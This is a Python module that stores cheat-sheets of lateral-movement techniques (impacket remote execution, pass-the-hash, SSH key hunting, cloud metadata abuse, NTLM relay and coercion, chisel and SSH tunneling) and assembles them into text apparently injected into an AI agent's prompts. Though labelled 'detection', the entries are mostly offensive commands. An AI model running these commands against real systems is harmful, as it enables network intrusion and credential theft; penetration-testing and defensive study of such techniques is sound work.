"""Lateral movement knowledge base.

Deep knowledge about lateral movement:
1. Windows lateral movement
2. Linux lateral movement
3. Cloud lateral movement
4. Credential relay attacks
5. Pivoting and tunneling
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class LateralMovementPattern:
    """A lateral movement pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


LATERAL_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "lat-001", "name": "Windows Lateral Movement",
        "category": "windows", "severity": "critical",
        "desc": "Windows lateral movement techniques.",
        "detection": (
            "WINDOWS LATERAL MOVEMENT:\n"
            "REMOTE EXECUTION:\n"
            "  PsExec:\n"
            "    # impacket-psexec user:pass@TARGET\n"
            "    # Creates PSEXESVC service\n"
            "    # Runs as SYSTEM\n"
            "  WMI:\n"
            "    # impacket-wmiexec user:pass@TARGET\n"
            "    # wmic /node:TARGET process call create 'cmd'\n"
            "    # No service creation\n"
            "  WinRM:\n"
            "    # evil-winrm -i TARGET -u user -p pass\n"
            "    # PowerShell remoting\n"
            "    # Invoke-Command -ComputerName TARGET\n"
            "  DCOM:\n"
            "    # impacket-dcomexec user:pass@TARGET\n"
            "    # Multiple COM objects\n"
            "  SMB:\n"
            "    # impacket-smbexec user:pass@TARGET\n"
            "    # No binary upload\n"
            "  Scheduled Tasks:\n"
            "    # schtasks /create /s TARGET /tn task /tr cmd\n"
            "  MMC20.Application:\n"
            "    # DCOM lateral via MMC\n"
            "CREDENTIAL-BASED:\n"
            "  - Pass-the-Hash (PtH)\n"
            "    # impacket-psexec -hashes :NTLM user@TARGET\n"
            "  - Pass-the-Ticket (PtT)\n"
            "    # export KRB5CCNAME=ticket.ccache\n"
            "  - Overpass-the-Hash\n"
            "    # Rubeus asktgt /user:x /rc4:hash\n"
            "TOOLS:\n"
            "  impacket, CrackMapExec, evil-winrm, Rubeus"
        ),
        "tools": [],
    },
    {
        "id": "lat-002", "name": "Linux Lateral Movement",
        "category": "linux", "severity": "high",
        "desc": "Linux lateral movement techniques.",
        "detection": (
            "LINUX LATERAL MOVEMENT:\n"
            "SSH:\n"
            "  - Key-based access\n"
            "    # ssh -i key.pem user@TARGET\n"
            "    # Find keys: find / -name 'id_rsa' 2>/dev/null\n"
            "    # Check ~/.ssh/authorized_keys\n"
            "    # SSH agent forwarding hijack\n"
            "      # SSH_AUTH_SOCK in /tmp/ssh-*/agent.*\n"
            "  - Credential reuse\n"
            "    # Same passwords across systems\n"
            "    # /etc/shadow cracking\n"
            "TRUST RELATIONSHIPS:\n"
            "  - NFS exports\n"
            "    # showmount -e TARGET\n"
            "    # Mount and access files\n"
            "  - SSH keys in shared directories\n"
            "  - .rhosts / hosts.equiv\n"
            "  - Ansible/Chef/Puppet control\n"
            "APPLICATIONS:\n"
            "  - Database connections\n"
            "    # Credential files (my.cnf, pgpass)\n"
            "  - Web application configs\n"
            "    # Connection strings\n"
            "  - Container escape to host\n"
            "    # Docker socket mount\n"
            "    # Kubernetes service accounts\n"
            "CRON / SYSTEMD:\n"
            "  - Scheduled task modification\n"
            "  - Service manipulation\n"
            "  - Socket activation\n"
            "TOOLS:\n"
            "  ssh, sshpass, proxychains, chisel"
        ),
        "tools": [],
    },
    {
        "id": "lat-003", "name": "Cloud Lateral Movement",
        "category": "cloud", "severity": "critical",
        "desc": "Cloud lateral movement techniques.",
        "detection": (
            "CLOUD LATERAL MOVEMENT:\n"
            "AWS:\n"
            "  - EC2 instance role abuse\n"
            "    # Metadata: 169.254.169.254\n"
            "    # Assume role to other services\n"
            "  - Cross-account role assumption\n"
            "    # sts assume-role\n"
            "  - Lambda function pivoting\n"
            "  - SSM session to other instances\n"
            "    # aws ssm start-session --target ID\n"
            "  - S3 bucket access from EC2\n"
            "AZURE:\n"
            "  - Managed identity abuse\n"
            "    # IMDS endpoint\n"
            "    # Token for other services\n"
            "  - Subscription pivoting\n"
            "  - Azure AD to Azure resources\n"
            "  - Hybrid joined devices\n"
            "  - Azure DevOps service connections\n"
            "GCP:\n"
            "  - Service account key abuse\n"
            "  - Metadata server tokens\n"
            "  - Cross-project access\n"
            "  - GKE to GCP services\n"
            "KUBERNETES:\n"
            "  - Service account token theft\n"
            "  - Pod-to-pod communication\n"
            "  - Node access from pod\n"
            "  - Secret extraction\n"
            "    # kubectl get secrets\n"
            "TOOLS:\n"
            "  Pacu, CloudFox, ScoutSuite, kubectl"
        ),
        "tools": [],
    },
    {
        "id": "lat-004", "name": "Credential Relay Attacks",
        "category": "relay", "severity": "critical",
        "desc": "Credential relay and coercion.",
        "detection": (
            "CREDENTIAL RELAY:\n"
            "NTLM RELAY:\n"
            "  - Capture NTLM authentication\n"
            "    # Responder (LLMNR/NBT-NS poison)\n"
            "  - Relay to SMB\n"
            "    # impacket-ntlmrelayx -tf targets.txt\n"
            "    # --no-http-server -smb2support\n"
            "  - Relay to LDAP/LDAPS\n"
            "    # Modify AD objects\n"
            "    # Add computer to domain\n"
            "    # Configure RBCD\n"
            "  - Relay to HTTP (ADCS)\n"
            "    # ESC8: NTLM relay to web enrollment\n"
            "    # Request certificate as target\n"
            "COERCION:\n"
            "  - PetitPotam\n"
            "    # Force DC authentication via EFS\n"
            "  - PrinterBug/SpoolSample\n"
            "    # Force target to auth to us\n"
            "  - DFSCoerce\n"
            "    # Via DFS protocol\n"
            "  - ShadowCoerce\n"
            "    # Via VSS protocol\n"
            "KERBEROS RELAY:\n"
            "  - KrbRelayUp\n"
            "    # Local privilege escalation\n"
            "    # RBCD abuse\n"
            "  - Cross-protocol relay\n"
            "MITIGATION:\n"
            "  - EPA (Extended Protection)\n"
            "  - SMB signing required\n"
            "  - LDAP signing/channel binding\n"
            "TOOLS:\n"
            "  Responder, impacket, Rubeus, Certify"
        ),
        "tools": [],
    },
    {
        "id": "lat-005", "name": "Pivoting and Tunneling",
        "category": "pivoting", "severity": "high",
        "desc": "Network pivoting techniques.",
        "detection": (
            "PIVOTING & TUNNELING:\n"
            "SSH TUNNELING:\n"
            "  Local port forward:\n"
            "    # ssh -L 8080:internal:80 user@pivot\n"
            "  Remote port forward:\n"
            "    # ssh -R 9090:localhost:80 user@external\n"
            "  Dynamic (SOCKS):\n"
            "    # ssh -D 1080 user@pivot\n"
            "    # proxychains nmap TARGET\n"
            "  ProxyJump:\n"
            "    # ssh -J pivot1,pivot2 target\n"
            "CHISEL:\n"
            "  # Server: chisel server -p 8000 --reverse\n"
            "  # Client: chisel client SERVER:8000 R:socks\n"
            "  # Fast HTTP tunnel, socks5\n"
            "LIGOLO-NG:\n"
            "  # Agent-based, no SOCKS needed\n"
            "  # Direct network access\n"
            "  # Multi-hop pivoting\n"
            "OTHER:\n"
            "  - socat relays\n"
            "    # socat TCP-LISTEN:8080,fork TCP:TARGET:80\n"
            "  - rpivot (reverse socks proxy)\n"
            "  - sshuttle (VPN over SSH)\n"
            "    # sshuttle -r user@pivot 10.0.0.0/8\n"
            "  - Meterpreter autoroute\n"
            "  - Cobalt Strike SOCKS\n"
            "DOUBLE PIVOT:\n"
            "  - Chain through multiple networks\n"
            "  - proxychains-ng multi-hop\n"
            "  - SSH agent forwarding chain\n"
            "TOOLS:\n"
            "  chisel, ligolo-ng, sshuttle, proxychains"
        ),
        "tools": [],
    },
]


class LateralMovementKB:
    """Lateral movement knowledge base.

    Provides lateral movement patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, LateralMovementPattern] = {}
        self._log = logger.bind(component="lateral_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load lateral movement patterns."""
        for data in LATERAL_PATTERNS:
            pattern = LateralMovementPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[LateralMovementPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_lateral_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build lateral movement prompt."""
        lines = ["## Lateral Movement\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
